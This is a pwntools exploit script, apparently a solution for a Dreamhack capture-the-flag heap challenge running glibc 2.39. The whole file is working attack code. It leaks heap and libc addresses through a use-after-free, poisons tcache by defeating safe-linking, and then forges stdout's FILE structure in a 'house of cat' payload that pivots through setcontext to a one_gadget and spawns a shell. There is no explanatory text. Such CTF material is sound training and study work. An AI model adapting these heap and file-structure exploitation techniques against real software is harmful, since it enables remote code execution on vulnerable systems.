#!/usr/bin/python3
from pwn import *

exe = ELF('./prob_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe 

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x00000000000013C8
		brva 0x0000000000001774	
		b* _IO_wfile_seekoff
		b* _IO_switch_to_wget_mode
		c
		''')

HOST = "host8.dreamhack.games"
PORT = 10541

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def write(name1, name2, content):
	sla(b'Choice: ', b'1')
	sla(b'name: ', name1)
	sla(b'name: ', name2)
	sla(b'content: ', content)
def read(name):
	sla(b'Choice: ', b'2')
	sla(b'name: ', name)
def delete(name1, name2):
	sla(b'Choice: ', b'3')
	sla(b'name: ', name1)
	sla(b'name: ', name2)
def edit(name1, name2, content):
	sla(b'Choice: ', b'4')
	sla(b'name: ', name1)
	sla(b'name: ', name2)
	sla(b'content: ', content)	

# From docker : Ubuntu:24.04 Libc 2.39
#GDB()
input("Stage 1: Leak libc")
write(b'A', b'A', b'A')
write(b'A1', b'A1', b'A1')
delete(b'A', b'A')
sla(b'Choice: ', b'4')
sla(b'name: ', b'A')
sla(b'name: ', b'A')
ru(b'content: ')
heap_base = leak(r(5)) << 12
info("Heap Base: ", heap_base)
sla(b'content: ', p64(0))
delete(b'A', b'A')
target = ((heap_base + 0x2a0) >> 12) ^ (heap_base + 0x60)
edit(b'A', b'A', p64(target))
write(b'A', b'A', b'A1')
write(b'B', b'B', b'\x00' * 0xe + p8(7))
edit(b'A', b'A', p64(0))
delete(b'A', b'A')
read(b'A')
ru(b'Content: ')
libc.address = leak(r(6),0x203b20)
info("libc base: ", libc.address)
input("Stage 2: overwrite setcontext (house of cat)")
setcontext = libc.address + 0x4a960
one_gadget = libc.address + 0xef4ce
pld = p64(setcontext)
pld = pld.ljust(0x18, b'\x00') + p64(0)
pld = pld.ljust(0x20, b'\x00') + p64(heap_base + 0x6b0) # rdx
pld = pld.ljust(0xe0, b'\x00') + p64(heap_base + 0x5b0 - 0x18)
edit(b'A1', b'A1', pld)
stderr = libc.sym._IO_2_1_stderr_
stdout = libc.sym._IO_2_1_stdout_
target = ((heap_base + 0x2a0) >> 12) ^ (stdout)
edit(b'B', b'B', b'\x00' * 0xe + p8(0))
write(b'A', b'A', b'A')
delete(b'A', b'A')
edit(b'A', b'A', p64(0))
delete(b'A', b'A')
edit(b'A', b'A', p64(target))
write(b'A', b'A', b'A')	
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
part1 = (libc.sym._IO_wfile_jumps + 0x10) & 0xffffffff
part2 = (libc.sym._IO_wfile_jumps + 0x10) >> 32 & 0xffff 
pld = p64(0xfbad2887) + p64(0) + p64(1)
pld = pld.ljust(0x78, b'\x00') + p64(heap_base + 0x8c0) 
pld = pld.ljust(0x88, b'\x00') + p64(libc.sym._IO_2_1_stdout_ - 0x50) 
pld = pld.ljust(0xa0, b'\x00') + p64(heap_base + 0x5b0)  
pld = pld.ljust(0xa8, b'\x00') + p64(one_gadget)
pld = pld.ljust(0xd8, b'\x00') + p32(part1) + p16(part2)
write(p64(libc.address + 0x2a5c0), p64(0), pld)
p.interactive()